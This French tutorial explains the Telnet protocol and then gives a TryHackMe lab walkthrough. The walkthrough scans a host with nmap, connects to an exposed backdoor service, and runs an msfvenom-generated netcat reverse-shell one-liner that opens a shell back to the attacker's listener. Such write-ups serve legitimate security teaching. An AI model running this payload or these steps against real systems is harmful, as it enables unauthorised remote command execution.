---
sidebar: auto
date: 2024-04-21
---
# Protocole Telnet
<Badge type="tip" text="Rédigé le 21/04/2024" />

## Introduction à Telnet

Telnet est un protocole d'application permettant de se connecter à une machine distante via un réseau. Il fonctionne sur la couche d'application du modèle TCP/IP, facilitant la communication textuelle entre deux appareils.

### Fonctionnement de Telnet

1. ***Connexion Client-Serveur***: Le client Telnet initie une connexion TCP avec le serveur Telnet. Cette connexion se fait généralement sur le port 23, le port par défaut pour Telnet.
2. ***Poignée de main***: Une fois la connexion établie, un processus de poignée de main se déroule entre le client et le serveur pour négocier divers paramètres, tels que le type de terminal, l'ensemble de caractères et la vitesse du terminal.
3. ***Session interactive***: Après la poignée de main, le client présente à l'utilisateur un invite de commande, transformant ainsi le client en un terminal virtuel. À partir de là, l'utilisateur peut saisir des commandes et interagir avec le système distant comme s'il était physiquement présent à sa console.
4. ***Échange de données***: Toutes les commandes saisies par l'utilisateur à l'invite de commande Telnet sont transmises sur le réseau au serveur Telnet. De même, toute sortie générée par le serveur en réponse à ces commandes est renvoyée au client pour affichage.

### Remarque sur la sécurité de Telnet

Il est important de noter que Telnet présente des vulnérabilités de sécurité significatives. Il transmet toutes les données, y compris les mots de passe et autres informations sensibles, en texte clair, le rendant susceptible à l'interception et à l'écoute clandestine. En raison de ces risques de sécurité inhérents, Telnet a largement été remplacé par des alternatives plus sécurisées telles que SSH (Secure Shell) dans les implémentations modernes.

Pour se connecter à un serveur Telnet, on utilise généralement la syntaxe en ligne de commande : `telnet [nom d'hôte ou adresse IP] [port]`. Par exemple, `telnet exemple.com 23` tenterait d'établir une connexion Telnet à un serveur au nom d'hôte spécifié (exemple.com) sur le port 23.

## Énumération

L'énumération des clés peut être cruciale dans l'exploitation d'un service réseau mal configuré. Cependant, les vulnérabilités qui pourraient être potentiellement triviales à exploiter ne sautent pas toujours aux yeux. Pour cette raison, notamment en ce qui concerne l'énumération des services réseau, on doit être méthodiques dans notre approche.

### Exemple avec 10.10.65.56

On commence par énumérer les ports actifs :
```shell
┌──(rootdev㉿kali)-[~]
└─$ nmap -p- -v -A 10.10.65.56  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 00:04 CEST
[...]
Scanning 10.10.65.56 [65535 ports]
Discovered open port 8012/tcp on 10.10.65.56
Completed Connect Scan at 00:06, 130.21s elapsed (65535 total ports)
Initiating Service scan at 00:06
Scanning 1 service on 10.10.65.56
Completed Service scan at 00:09, 157.57s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.65.56.
[...]
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
```
Si on avait scanner sans l'option `-p-`, le port 8012 n'aurait pas été trouvé car il n'est pas considéré comme un port standard, ou du top 1000 des ports.
On se rend compte ici de l'importance de prendre le temps de tout scanner, cela permet d'éviter de passer à côté de certaines vulnérabilités.

Dans les résultats de ce scan, on peut lire `SKIDY'S BACKDOOR. Type .HELP to view commands`, ce qui signifie que ce port peut potentiellement être utilisé pour insérer une Backdoor.

## Exploiter Telnet

Telnet, en tant que protocole, est intrinsèquement non sécurisé pour les raisons évoquées précédemment. Il manque de chiffrement, ce qui signifie que ***toutes les communications sont envoyées en texte clair***, et pour la plupart, il présente de faibles contrôles d'accès. Des CVE (Vulnérabilités et Expositions Communes) existent pour les systèmes clients et serveurs Telnet, ce qui permet de vérifier ces vulnérabilités sur des bases de données telles que :

https://www.cvedetails.com/

https://cve.mitre.org/

Un CVE est une liste de failles de sécurité informatique publiquement divulguées. Lorsqu'on fait référence à un CVE, on se réfère généralement au numéro d'identification CVE attribué à une faille de sécurité.

Cependant, il est beaucoup plus probable de trouver une mauvaise configuration dans la façon dont Telnet a été configuré ou fonctionne, ce qui permettra à un attaquant de l'exploiter.

### Démontage de la méthode

Ainsi, à partir de l'étape d'énumération, il est connu que :

1. Il y a un service Telnet mal dissimulé en cours d'exécution sur cette machine.
2. Le service lui-même est marqué comme "backdoor".
3. Il existe un nom d'utilisateur possible "Skidy" impliqué.

En utilisant ces informations, l'attaquant peut essayer d'accéder à ce port Telnet et d'utiliser cela comme un point d'appui pour obtenir un shell inversé complet sur la machine cible.

#### Connexion à Telnet

Il est possible de se connecter à un serveur Telnet avec la syntaxe suivante :

```shell
telnet [ip] [port]
```

### Qu'est-ce qu'un Shell Inversé ?

Un "shell" peut simplement être décrit comme un morceau de code ou un programme qui peut être utilisé pour obtenir l'exécution de code ou de commandes sur un appareil.

Un shell inversé est un type de shell dans lequel la machine cible communique avec la machine attaquante.

La machine attaquante a un port d'écoute, sur lequel elle reçoit la connexion, ce qui permet d'atteindre l'exécution de code ou de commandes.

### Exploit

Connexion en Telnet à la machine :
```shell
┌──(rootdev㉿kali)-[~]
└─$ telnet 10.10.65.56 8012
Trying 10.10.65.56...
Connected to 10.10.65.56.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```
Aucun retour sur les commandes, en revanche, lorsque l'on écoute les ping, on se rend compte que notre machine attaquante communique bien avec l'attaquée :
```shell
┌──(rootdev㉿kali)-[~]
└─$ sudo tcpdump ip proto \\icmp -i tun0

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:28:53.364751 IP 10.11.82.176 > 10.10.65.56: ICMP echo request, id 32639, seq 1, length 64
00:28:53.412509 IP 10.10.65.56 > 10.11.82.176: ICMP echo reply, id 32639, seq 1, length 64
```
Grâce à cela, on peut envoyer un Reverse Shell avec ***msfvenom*** :
```shell
┌──(rootdev㉿kali)-[~/]
└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.82.176 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 94 bytes
mkfifo /tmp/vsnfs; nc 10.11.82.176 4444 0</tmp/vsnfs | /bin/sh >/tmp/vsnfs 2>&1; rm /tmp/vsnfs
```
* *-p = payload*
* *lhost = our local host IP address (this is your machine's IP address)*
* *lport = the port to listen on (this is the port on your machine)*
* *R = export the payload in raw format*

Et celui-ci, on va l'exécuter sur la machine attaquée après avoir écouté le port 4444 avec la commande `nc -lvp 4444`

Sur le terminal Telnet, on exécute :
```shell
.RUN mkfifo /tmp/vsnfs; nc 10.11.82.176 4444 0</tmp/vsnfs | /bin/sh >/tmp/vsnfs 2>&1; rm /tmp/vsnfs
```

On se rend compte ainsi que sur le terminal où l'on écoute le port 4444 que l'on est connecté :
```shell
┌──(laguigue㉿kali)-[~]
└─$ nc -lvp 4444              
listening on [any] 4444 ...
10.10.65.56: inverse host lookup failed: Unknown host
connect to [10.11.82.176] from (UNKNOWN) [10.10.65.56] 39200
```

Ici, il s'agit d'un exemple très simplé du cours TryHackMe sur les [services réseaux](https://tryhackme.com/r/room/networkservices), malgré qu'il soit très peu probable que ce soit si facile en situation réelle.

<hr>
<br>

::: info Sources
Ce cours s'inspire (et utilise les images) de TryHackMe.com de la chambre "*Network Services*" :
https://tryhackme.com/r/room/networkservices
:::